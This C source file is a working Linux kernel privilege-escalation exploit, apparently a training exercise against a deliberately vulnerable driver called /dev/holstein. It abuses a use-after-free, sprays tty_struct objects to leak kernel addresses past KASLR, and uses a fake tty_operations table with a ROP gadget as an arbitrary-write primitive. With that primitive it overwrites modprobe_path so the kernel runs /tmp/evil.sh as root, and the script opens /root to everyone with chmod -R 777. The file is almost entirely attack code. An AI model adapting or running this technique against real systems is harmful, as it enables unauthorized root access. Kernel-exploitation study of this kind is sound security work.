/**
 * uaf-aaw:
 *   - SMEP is enabled
 *   - SMAP is enabled
 *   - KASLR is enabled
 *   - KPTI is enabled
 *
 * Causes the kernel to execute `/tmp/evil.sh`, by modifying the
 * `modprobe_path`, and triggering `call_modprobe()`.
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <unistd.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_tty_ops 0xc39c60
#define addr_modprobe_path (kbase + 0xe38480)   // "/sbin/modprobe"
#define rop_mov_prdx_rcx (kbase + 0x1b2d06)     // mov qword [rdx], rcx; ret;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int fd1, fd2;
int spray[50];
char buf[0x400];
int cache_fd = -1;

void AAW32(unsigned long addr, unsigned int val) {
  if (cache_fd == -1) {
    // fake tty_operations
    *(unsigned long*)&buf[0x3f8] = rop_mov_prdx_rcx;
    *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
    write(fd2, buf, 0x400);
  }
  
  if (cache_fd == -1) {
    for (int i = 0; i < 50; i++) {
      int v = ioctl(spray[i], val /* rcx */, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
	break;
      }
    }
  } else {
    ioctl(cache_fd, val /* rcx */, addr /* rdx */);
  }
}

int main() {
  save_state();

  // First use-after-free. This controlled tty_struct object will be used
  // to store the fake stack and the RIP control address (tty_operations)
  fd1 = open("/dev/holstein", O_RDWR);
  fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  // tty_struct spray
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // KASLRの回避
  read(fd2, buf, 0x400);
  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  // overwrite modprobe_path
  char cmd[] = "/tmp/evil.sh";
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
  }

  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn"); // modprobe_pathの呼び出し

  return 0;
}
